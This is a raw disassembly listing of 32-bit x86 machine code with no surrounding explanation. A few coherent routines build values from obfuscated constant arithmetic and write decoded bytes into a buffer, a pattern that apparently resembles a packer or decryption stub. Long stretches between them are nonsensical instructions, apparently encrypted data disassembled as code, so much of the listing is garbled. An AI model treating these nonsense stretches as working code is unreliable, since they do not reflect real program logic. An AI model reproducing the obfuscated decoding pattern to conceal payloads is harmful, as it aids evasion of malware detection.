  416b77:	ret    
  416b78:	aaa    
  416b79:	retf   0x8926
  416b7c:	sbb    BYTE PTR [edi+0x305c2312],ah
  416b82:	push   es
  416b83:	outs   dx,BYTE PTR ds:[esi]
  416b84:	xchg   ebp,eax
  416b85:	mov    ds:0x9ea07ba9,al
  416b8a:	mov    edi,0x3c235045
  416b8f:	sub    BYTE PTR [ebx+esi*2],0xef
  416b93:	mov    ch,0xde
  416b95:	sub    al,0x4b
  416b97:	pop    eax
  416b98:	and    al,0xe0
  416b9a:	sub    BYTE PTR [ecx-0x37],ch
  416b9d:	mov    esp,0x2ae45361
  416ba2:	popa   
  416ba3:	lea    ebp,[ebx+esi*8+0x2b]
  416ba7:	mov    WORD PTR [esi],fs
  416ba9:	in     eax,dx
  416baa:	data16 jnp 0x416c13
  416bad:	or     BYTE PTR [edx-0x3317b0d7],ch
  416bb3:	jbe    0x416c2c
  416bb5:	push   esi
  416bb6:	mov    DWORD PTR [esp+eax*2-0x20],esi
  416bba:	in     eax,0x3
  416bbc:	aad    0xf0
  416bbe:	shl    esp,cl
  416bc0:	cdq    
  416bc1:	ror    DWORD PTR ds:0x41ada093,cl
  416bc7:	jg     0x416c36
  416bc9:	inc    BYTE PTR [ecx+0x33]
  416bcc:	rcl    DWORD PTR [ecx],1
  416bce:	test   eax,0xd81ba742
  416bd3:	jge    0x416c53
  416bd5:	ret    0xa451
  416bd8:	or     BYTE PTR [ebp+0x39],dh
  416bdb:	lods   eax,DWORD PTR ds:[esi]
  416bdc:	sbb    DWORD PTR [eax],ebx
  416bde:	test   dl,cl
  416be0:	adc    edx,DWORD PTR [ecx-0x2d]
  416be3:	and    BYTE PTR ds:0xec492e6f,dl
  416be9:	jle    0x416b72
  416beb:	lea    eax,[ebx]
  416bed:	push   ds
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42820f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42833b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x4281eb,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428263,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x4282c3,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281ab
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x4281ef,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0x47
  416d7e:	stos   DWORD PTR es:[edi],eax
  416d7f:	push   ss
  416d80:	stos   BYTE PTR es:[edi],al
  416d81:	jp     0x416d77
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    BYTE PTR [eax],cl
  416d8a:	xchg   ebx,eax
  416d8b:	adc    al,0x29
  416d8d:	test   al,0x9e
  416d8f:	add    al,0xea
  416d91:	mov    gs:0xd5b0fc39,eax
  416d97:	mov    esp,0xb925faa4
  416d9c:	loopne 0x416d93
  416d9e:	jbe    0x416dec
  416da0:	retf   0xa0de
  416da3:	lods   eax,DWORD PTR ds:[esi]
  416da4:	pop    ebp
  416da5:	jno    0x416e10
  416da7:	cmp    ch,BYTE PTR [edx+0x4f8f5cfe]
  416dad:	pop    esi
  416dae:	sub    ebx,DWORD PTR ds:0x4f42981d
  416db4:	cld    
  416db5:	aas    
  416db6:	retf   0x8f2b
  416db9:	or     BYTE PTR [esi+0x32],ah
  416dbc:	outs   dx,BYTE PTR ds:[esi]
  416dbd:	cwde   
  416dbe:	ret    
  416dbf:	pop    edi
  416dc0:	dec    eax
  416dc1:	arpl   WORD PTR [eax-0x28],bx
  416dc4:	lahf   
  416dc5:	fs fs push eax
  416dc8:	mov    edx,0xde0ea24a
  416dcd:	add    edi,0xffffffba
  416dd0:	add    ch,BYTE PTR [esi-0x28]
  416dd3:	sub    al,0xf9
  416dd5:	and    al,0xe4
  416dd7:	in     al,dx
  416dd8:	aam    0xaf
  416dda:	pushf  
  416ddb:	mov    al,ds:0x5755f02
  416de0:	xor    al,0x23
  416de2:	stos   DWORD PTR es:[edi],eax
  416de3:	xchg   ecx,eax
  416de4:	mov    bh,0xb1
  416de6:	cli    
  416de7:	jmp    DWORD PTR [ebp+0xb007010]
  416ded:	xchg   BYTE PTR [edx-0x5fc57e24],ch
  416df3:	test   BYTE PTR [eax+0x50],al
  416df6:	jmp    0x416dba
  416df8:	imul   edx,ebp,0x49009e0d
  416dfe:	mov    eax,0x409443ea
  416e03:	xchg   esp,eax
  416e04:	push   0xffffffb9
  416e06:	mov    bl,0xc1
  416e08:	jns    0x416df7
  416e0a:	fs or  eax,0x23672411
  416e10:	xor    dh,bl
  416e12:	ror    BYTE PTR [ebx-0xd],0x92
  416e16:	dec    edi
  416e17:	jae    0x416e69
  416e19:	jmp    0x416e6f
  416e1b:	lods   al,BYTE PTR cs:[esi]
  416e1d:	or     DWORD PTR [ebx+0x29],ebx
  416e20:	sub    BYTE PTR [esi-0x34],al
  416e23:	add    BYTE PTR [edx],0x99
  416e26:	jbe    0x416dc6
  416e28:	icebp  
  416e29:	dec    ebx
  416e2a:	hlt    
  416e2b:	sbb    al,0xc4
  416e2d:	jle    0x416eaa
  416e2f:	inc    esp
  416e30:	pusha  
  416e31:	jbe    0x416e5f
  416e33:	push   esi
  416e34:	lar    edx,WORD PTR ss:[edi-0x94a5672]
  416e3c:	add    eax,DWORD PTR [edx+0x44]
  416e3f:	push   0x29
  416e41:	cwde   
  416e42:	jo     0x416e2a
  416e44:	shl    al,1
  416e46:	sub    al,BYTE PTR [ecx]
  416e48:	sbb    dl,dl
  416e4a:	bound  esp,QWORD PTR [ebx-0xc94865c]
  416e50:	repnz test al,0x82
  416e53:	mov    dl,0x79
  416e55:	dec    ecx
  416e56:	jns    0x416e00
  416e58:	popa   
  416e59:	sbb    al,0xd6
  416e5b:	pop    ss
  416e5c:	fsubr  st(5),st
  416e5e:	sbb    BYTE PTR [eax-0x66],ah
  416e61:	bound  esi,QWORD PTR [esi]
  416e63:	int3   
  416e64:	dec    esp
  416e65:	cdq    
  416e66:	loopne 0x416def
  416e68:	retf   
  416e69:	rcr    BYTE PTR [eax],cl
  416e6b:	jo     0x416e95
  416e6d:	test   BYTE PTR [esi],ch
  416e6f:	sub    BYTE PTR [ecx],bl
  416e71:	aad    0x8c
  416e73:	out    0xc9,eax
  416e75:	cmp    cl,BYTE PTR [ebx-0x63242dbc]
  416e7b:	cwde   
  416e7c:	cmp    BYTE PTR [ecx],bl
  416e7e:	hlt    
  416e7f:	cmp    ah,BYTE PTR [ebp-0x56]
  416e82:	mov    DWORD PTR [eax+0x6081a9c3],ecx
  416e88:	cmp    BYTE PTR [ecx+0x76],ah
  416e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8c:	div    DWORD PTR [ebx+eax*1]
  416e8f:	and    eax,0x1dd53854
  416e94:	fldcw  WORD PTR [edx]
  416e96:	pop    esi
  416e97:	sub    esi,DWORD PTR [eax-0x7c]
  416e9a:	test   al,0xf4
  416e9c:	adc    DWORD PTR [ebp-0x53],esi
  416e9f:	push   edi
  416ea0:	mov    ch,0x83
  416ea2:	mov    dl,0x94
  416ea4:	and    bl,ch
  416ea6:	addr16 mov ds:0xe844,eax
  416eaa:	mov    al,ds:0x655efbe3
  416eaf:	mov    edi,0x16f6b969
  416eb4:	sub    eax,0x22
  416eb7:	imul   ebp,DWORD PTR [edi+0xdfade98],0x7
  416ebe:	cs or  eax,0x4cc8f93d
  416ec4:	cmp    al,0xd5
  416ec6:	shl    BYTE PTR [edi-0x7],cl
  416ec9:	mov    edx,esp
  416ecb:	sti    
  416ecc:	cs aaa 
  416ece:	push   ebp
  416ecf:	push   0xbc6fae4
  416ed4:	scas   al,BYTE PTR es:[edi]
  416ed5:	call   0x19e0:0x710c1a7e
  416edc:	jle    0x416f13
  416ede:	lods   al,BYTE PTR ds:[esi]
  416edf:	sbb    BYTE PTR [edx+0x4b1e65e5],ch
  416ee5:	add    dh,BYTE PTR [esi+eiz*8-0x59f0ee2f]
  416eec:	sbb    DWORD PTR [eax],eax
  416eee:	dec    esi
  416eef:	mov    WORD PTR [edx-0x76689e50],fs
  416ef5:	xchg   BYTE PTR [eax],dl
  416ef7:	mov    bh,0x20
  416ef9:	aas    
  416efa:	fs and ch,BYTE PTR fs:[eax-0x62]
  416eff:	push   cs
  416f00:	xchg   edi,eax
  416f01:	jecxz  0x416f47
  416f03:	(bad)  
  416f05:	inc    esi
  416f06:	push   esi
  416f07:	dec    eax
  416f08:	sahf   
  416f09:	out    dx,eax
  416f0a:	int    0x4f
  416f0c:	xor    BYTE PTR [ebp-0x65a24317],dh
  416f12:	out    dx,al
  416f13:	mov    eax,0x2618127d
  416f18:	xchg   esp,eax
  416f19:	or     eax,0xc6d8fefb
  416f1e:	sbb    edx,edx
  416f20:	sub    ebp,edx
  416f22:	pop    ecx
  416f23:	shr    BYTE PTR [esi+0x4b],cl
  416f26:	or     DWORD PTR [edi-0x68af015a],edi
  416f2c:	(bad)  
  416f2e:	(bad)  
  416f2f:	and    DWORD PTR ds:0xd323f766,esp
  416f35:	mov    eax,0x9f4db4d6
  416f3a:	lock aaa 
  416f3c:	das    
  416f3d:	jp     0x416f5e
  416f3f:	in     al,0x34
  416f41:	cmp    eax,edi
  416f43:	les    ebx,FWORD PTR ds:0x4c3c4f69
  416f49:	lods   al,BYTE PTR ds:[esi]
  416f4a:	mov    edi,0x63524097
  416f4f:	mov    eax,0xcce8921e
  416f54:	sub    DWORD PTR [ebx+0x65d21861],ebp
  416f5a:	sub    edx,DWORD PTR [ecx+0x64]
  416f5d:	sub    BYTE PTR [ebx+esi*1],0xac
  416f61:	xchg   ecx,eax
  416f62:	pop    esp
  416f63:	iret   
  416f64:	fisubr DWORD PTR [ecx+edi*2+0x10ee5c18]
  416f6b:	adc    DWORD PTR [eax-0x78044044],esp
  416f71:	adc    esi,DWORD PTR [edi-0x4b]
  416f74:	pusha  
  416f75:	(bad)  
  416f76:	int3   
  416f77:	cmp    edx,DWORD PTR [ebp-0xe174ce4]
  416f7d:	fcomp  QWORD PTR [eax]
  416f7f:	shld   eax,edi,0x14
  416f83:	not    DWORD PTR [edx+edx*4]
  416f86:	xchg   esp,eax
  416f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f88:	cld    
  416f89:	bound  eax,QWORD PTR [ebp+ecx*1-0x4d]
  416f8d:	mov    cl,0xa1
  416f8f:	mov    ah,0x85
  416f91:	(bad)  
  416f92:	xchg   edi,eax
  416f93:	inc    ebx
  416f94:	test   BYTE PTR [esi-0x7d],al
  416f97:	jne    0x416feb
  416f99:	jl     0x416f85
  416f9b:	cs aas 
  416f9d:	fld    DWORD PTR [esi-0x7b344339]
  416fa3:	xor    al,0x6
  416fa5:	(bad)  ds:0x727bd01c
  416fab:	aas    
  416fac:	aad    0x7
  416fae:	mov    WORD PTR [eax+0x514b196e],gs
  416fb4:	shr    ebx,0x3d
  416fb7:	adc    edi,DWORD PTR [edi-0x2cf56a93]
  416fbd:	jecxz  0x416f52
  416fbf:	(bad)  
  416fc0:	lahf   
  416fc1:	cmp    dl,BYTE PTR cs:[ecx+0x3adec057]
  416fc8:	popf   
  416fc9:	jne    0x416fbd
  416fcb:	or     eax,0x28e10181
  416fd0:	sub    edi,eax
  416fd2:	clc    
  416fd3:	mov    cl,0x6c
  416fd5:	mov    ch,0x82
  416fd7:	inc    ebp
  416fd8:	or     eax,0xbc4bc41c
  416fdd:	lahf   
  416fde:	loop   0x416fef
  416fe0:	scas   eax,DWORD PTR es:[edi]
  416fe1:	outs   dx,BYTE PTR ds:[esi]
  416fe2:	xchg   edx,eax
  416fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe4:	inc    edx
  416fe5:	out    0xc2,al
  416fe7:	test   BYTE PTR [ecx],ch
  416fe9:	add    ebx,edx
  416feb:	and    ah,BYTE PTR [esi+0x47]
  416fee:	and    DWORD PTR [eax],esi
  416ff0:	stos   BYTE PTR es:[edi],al
  416ff1:	mov    al,0xca
  416ff3:	jno    0x416fcc
  416ff5:	mov    ah,0x9c
  416ff8:	not    esp
  416ffa:	shld   DWORD PTR [eax+0x79],esi,0x36
  416fff:	(bad)  
  417000:	idiv   BYTE PTR [edx+0x34c9178b]
  417006:	lock sub DWORD PTR [esi],esi
  417009:	dec    ecx
  41700a:	cmp    ebx,edx
  41700c:	jle    0x41704a
  41700e:	mov    al,0xa1
  417010:	aam    0xab
  417012:	dec    edx
  417013:	gs cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417016:	repnz out 0xec,eax
  417019:	test   eax,0xc541407c
  41701e:	xor    bh,ah
  417020:	dec    esi
  417021:	jl     0x417040
  417023:	fsubr  DWORD PTR [eax+0x7b78b67a]
  417029:	pop    eax
  41702a:	and    al,0x9e
  41702c:	add    ecx,ecx
  41702e:	and    ecx,DWORD PTR [ebx-0x15ca57af]
  417034:	loope  0x416feb
  417036:	aad    0x2a
  417038:	fld    QWORD PTR [esi]
  41703a:	je     0x4170bb
  41703c:	mov    al,ds:0x38386a58
  417041:	sbb    eax,0xfa27bd95
  417046:	sub    eax,0x256fec09
  41704b:	xchg   ecx,eax
  41704c:	push   0xc89fcdf4
  417051:	mov    BYTE PTR [esi-0x17f2255f],bl
  417057:	daa    
  417058:	cs popf 
  41705a:	int3   
  41705b:	mov    ecx,0xee8ed6d8
  417060:	shr    ebx,cl
  417062:	mov    esp,0xf261da53
  417067:	pushf  
  417068:	and    eax,0x930e4ecd
  41706d:	inc    ecx
  41706e:	dec    esp
  41706f:	xchg   ecx,eax
  417070:	mov    bh,0xf8
  417072:	lds    ebp,FWORD PTR [eax]
  417074:	mov    bh,0x70
  417076:	and    BYTE PTR [eax],bh
  417078:	out    0x1e,al
  41707a:	adc    al,ch
  41707c:	mov    ecx,0x9d6eb1cf
  417081:	lds    edx,FWORD PTR [eax-0x36]
  417084:	pushf  
  417085:	sbb    DWORD PTR [ebx+edx*4+0x41],esp
  417089:	mov    dl,0x5f
  41708b:	jo     0x4170c6
  41708d:	clc    
  41708e:	inc    ecx
  41708f:	lods   eax,DWORD PTR ds:[esi]
  417090:	aas    
  417091:	retf   
  417092:	rcr    DWORD PTR [ebp+0xd],1
  417095:	mov    edi,0x7dc6d76f
  41709a:	cmp    DWORD PTR [eax+0x47],esp
  41709d:	or     bl,BYTE PTR [ecx+eax*1+0x6c83b7c2]
  4170a4:	icebp  
  4170a5:	mov    esp,0x8bc3dfe9
  4170aa:	inc    ebp
  4170ab:	lock mov ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x6a45913c
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    dh,ch
  41719f:	(bad)  
  4171a0:	mov    edx,0xfbb20f26
  4171a5:	adc    eax,0xfd579940
  4171aa:	dec    esp
  4171ab:	and    DWORD PTR ds:0xe532a517,0xe62c5bcc
  4171b5:	dec    ecx
  4171b6:	sahf   
  4171b7:	std    
  4171b8:	in     al,dx
  4171b9:	shr    BYTE PTR [edx],cl
  4171bb:	sub    eax,0xe1997ee4
  4171c0:	jb     0x417183
  4171c2:	jnp    0x4171e2
  4171c4:	pusha  
  4171c5:	in     al,dx
  4171c6:	mov    eax,ds:0xce74bed6
  4171cb:	inc    edx
  4171cc:	scas   eax,DWORD PTR es:[edi]
  4171cd:	mov    ch,BYTE PTR [eax-0x66735b1a]
  4171d3:	ja     0x417254
  4171d5:	sub    al,0xcd
  4171d7:	sub    dl,cl
  4171d9:	addr16 nop
  4171db:	mov    ebp,0xcb13acb6
  4171e0:	ins    DWORD PTR es:[edi],dx
  4171e1:	test   ebp,esp
  4171e3:	ds out dx,al
  4171e5:	pop    esi
  4171e6:	sbb    al,BYTE PTR [esp+edi*4-0x62]
  4171ea:	xchg   esi,eax
  4171eb:	pop    edi
  4171ec:	or     ebp,edx
  4171ee:	and    eax,0x53358d65
  4171f3:	lock and DWORD PTR [ebx],0xffffff85
  4171f7:	lods   al,BYTE PTR ds:[esi]
  4171f8:	jecxz  0x417256
  4171fa:	jl     0x41722b
  4171fc:	xchg   esp,eax
  4171fd:	loop   0x417200
  4171ff:	sahf   
  417200:	test   BYTE PTR [eax],cl
  417202:	ins    BYTE PTR es:[edi],dx
  417203:	int    0xa7
  417205:	inc    esi
  417206:	jl     0x41727d
  417208:	xchg   DWORD PTR [edi],ebx
  41720a:	inc    ebp
  41720b:	mov    al,0x77
  41720d:	dec    ebp
  41720e:	or     ecx,ebp
  417210:	aam    0x37
  417212:	enter  0x1b7c,0xab
  417216:	out    dx,al
  417217:	pop    ebp
  417218:	push   esi
  417219:	sub    al,BYTE PTR [edx-0x58]
  41721c:	sbb    al,0x85
  41721e:	popf   
  41721f:	outs   dx,BYTE PTR ds:[esi]
  417220:	xor    eax,0xc3b0cda5
  417225:	cmp    edx,eax
  417227:	rol    DWORD PTR [eax],cl
  417229:	xchg   esp,eax
  41722a:	loop   0x41722c
  41722c:	pop    eax
  41722d:	inc    eax
  41722e:	and    ecx,DWORD PTR [ebp+0x6c]
  417231:	cmp    DWORD PTR [edx+0x3389e02a],ebx
  417237:	ja     0x417289
  417239:	je     0x41728c
  41723b:	add    al,BYTE PTR [esi]
  41723d:	mov    es,WORD PTR [ecx-0x2a]
  417240:	jo     0x417281
  417242:	xchg   ebp,eax
  417243:	test   BYTE PTR [ebx+0x25],dl
  417246:	sub    eax,0xd1d960ad
  41724b:	int3   
  41724c:	adc    DWORD PTR [edi-0x64],0x24
  417250:	xchg   edx,eax
  417251:	outs   dx,BYTE PTR ds:[esi]
  417252:	inc    esp
  417253:	rcr    DWORD PTR [ebx+0x5bcfb28a],0x33
  41725a:	popf   
  41725b:	in     al,dx
  41725c:	add    al,0x3a
  41725e:	jmp    0x417262
  417260:	dec    eax
  417261:	enter  0xe3c4,0x2d
  417265:	jns    0x41729c
  417267:	mov    dl,0xc4
  417269:	pop    esp
  41726a:	inc    edi
  41726b:	jmp    DWORD PTR ds:0x3664e2a4
  417271:	cwde   
  417272:	cs inc esi
  417274:	imul   ebx,ebp,0x48f0ab2f
  41727a:	div    DWORD PTR [ebx-0x2f]
  41727d:	or     dl,BYTE PTR [edi-0x2c]
  417280:	adc    eax,0x4aef4505
  417285:	js     0x4172fc
  417287:	mov    ch,BYTE PTR [ecx+0x65]
  41728a:	mov    eax,0xc90929dd
  41728f:	mov    ebx,0xefa8e9fd
  417294:	inc    ebx
  417295:	inc    ebp
  417296:	aaa    
  417297:	and    cl,BYTE PTR [eax+0x157f4db6]
  41729d:	lods   eax,DWORD PTR ds:[esi]
  41729e:	fistp  WORD PTR [esi+0x1582ed64]
  4172a4:	icebp  
  4172a5:	and    BYTE PTR [eax+0x6],0x81
  4172a9:	xchg   ecx,eax
  4172aa:	cmp    BYTE PTR ss:[edi],bh
  4172ad:	cmp    DWORD PTR [edx+0x408fd144],eax
  4172b3:	pusha  
  4172b4:	xchg   esp,eax
  4172b5:	call   0xa025:0x3ae9219c
  4172bc:	pop    es
  4172bd:	fisubr DWORD PTR [ebx+0x3014e30e]
  4172c3:	sbb    eax,0xadbc771a
  4172c8:	inc    ecx
  4172c9:	xor    DWORD PTR [edx],ecx
  4172cb:	dec    ecx
  4172cc:	mov    al,ds:0xa23fc4ec
  4172d1:	xor    al,0x3f
  4172d3:	inc    esi
  4172d4:	add    dh,BYTE PTR [ecx-0x33]
  4172d7:	sbb    eax,ebp
  4172d9:	cli    
  4172da:	xchg   DWORD PTR [edx-0x37cbd3ef],edx
  4172e0:	push   ebx
  4172e1:	clc    
  4172e2:	mov    bh,0x3a
  4172e4:	mov    ?,WORD PTR [esi-0x55]
  4172e7:	push   dx
  4172e9:	mov    ?,WORD PTR [esi-0x17]
  4172ec:	and    BYTE PTR [ebx-0x7bdc681],dh
  4172f2:	enter  0x65e1,0xbd
  4172f6:	and    al,0x0
  4172f8:	rcl    BYTE PTR [edi],1
  4172fa:	pop    es
  4172fb:	scas   al,BYTE PTR es:[edi]
  4172fc:	test   cl,bh
  4172fe:	xchg   edi,eax
  4172ff:	popa   
  417300:	(bad)  
  417301:	push   0x43
  417303:	fiadd  DWORD PTR [edx]
  417305:	stos   DWORD PTR es:[edi],eax
  417306:	push   edx
  417307:	popa   
  417308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417309:	and    al,0xf0
  41730b:	pusha  
  41730c:	(bad)  
  41730d:	push   0xffffffbd
  41730f:	xchg   ebp,eax
  417310:	cli    
  417311:	ret    
  417312:	mov    cl,0x20
  417314:	xchg   ecx,eax
  417315:	mov    ds:0x786c0053,eax
  41731a:	mov    ds:0x8b047182,al
  41731f:	lods   eax,DWORD PTR ds:[esi]
  417320:	sub    ebp,ecx
  417322:	mov    al,cl
  417324:	sub    eax,0x80aec987
  417329:	or     DWORD PTR [esi-0x6],ebp
  41732c:	pop    ecx
  41732d:	repz jnp 0x41739b
  417330:	lahf   
  417331:	add    eax,0x94245575
  417336:	push   0xdf9730ca
  41733b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41733c:	(bad)  
  41733d:	xchg   esp,eax
  41733e:	outs   dx,DWORD PTR ds:[esi]
  41733f:	imul   edx,DWORD PTR [eax+0x649a23c9],0xffffff93
  417346:	retf   
  417347:	dec    ecx
  417348:	daa    
  417349:	(bad)  
  41734a:	shl    BYTE PTR [esi+0x6c],cl
  41734d:	(bad)  
  41734f:	in     eax,0x65
  417351:	in     eax,dx
  417352:	shl    edi,1
  417354:	cmp    ebx,eax
  417356:	aaa    
  417357:	inc    esp
  417358:	add    DWORD PTR [ebp-0x18],esi
  41735b:	push   cs
  41735c:	jge    0x41737b
  41735e:	ja     0x4172e3
  417360:	dec    ebx
  417361:	loopne 0x4172e8
  417363:	in     eax,0xcb
  417365:	mov    ebx,0x1cc89e91
  41736a:	into   
  41736b:	jmp    0x4173c7
  41736d:	mov    ah,BYTE PTR [ebp+0x52]
  417370:	sahf   
  417371:	cmp    BYTE PTR [esi-0x4f31a4b0],dh
  417377:	adc    DWORD PTR [eax],esi
  417379:	xor    al,0x12
  41737b:	adc    esp,DWORD PTR [eax]
  41737d:	sbb    edi,DWORD PTR [esi+ebx*1]
  417380:	icebp  
  417381:	(bad)  
  417382:	jmp    0xeb457941
  417387:	add    edx,DWORD PTR [ebp+ebx*1+0x65]
  41738b:	mov    dh,0xfd
  41738d:	(bad)  [ebp-0x68]
  417390:	lods   eax,DWORD PTR ds:[esi]
  417391:	mov    bh,0xb5
  417393:	pop    esp
  417394:	sbb    edx,0x66
  417397:	or     al,0x14
